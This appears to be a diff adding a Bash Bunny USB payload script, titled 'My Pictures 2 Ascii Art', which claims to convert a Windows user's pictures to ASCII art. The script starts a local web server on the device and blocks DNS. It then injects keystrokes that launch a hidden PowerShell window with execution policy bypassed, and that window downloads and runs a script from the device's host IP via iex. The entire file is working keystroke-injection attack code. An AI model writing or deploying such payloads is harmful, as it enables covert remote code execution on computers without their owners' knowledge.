@@ -1,0 +1,33 @@
+#!/bin/bash
+# Title:          My Pictures 2 Ascii Art
+# Description:    Converts Jpeg, Png & BMP's in the My Pictures to ascii art versions.
+# Author:         Cribbit
+# Version:        1.0
+# Category:       General
+# Target:         Windows (Powershell 5.1+)
+# Attackmodes:    RNDIS_ETHERNET HID
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+
+# starting server
+LED SPECIAL
+
+# disallow outgoing dns requests so server starts immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+# attack commences
+LED ATTACK
+QUACK DELAY 200
+RUN WIN "powershell -Noni -NoP -W h -EP Bypass -C \"iex (New-Object Net.WebClient).DownloadString('http://$HOST_IP/s')\""
+LED FINISH
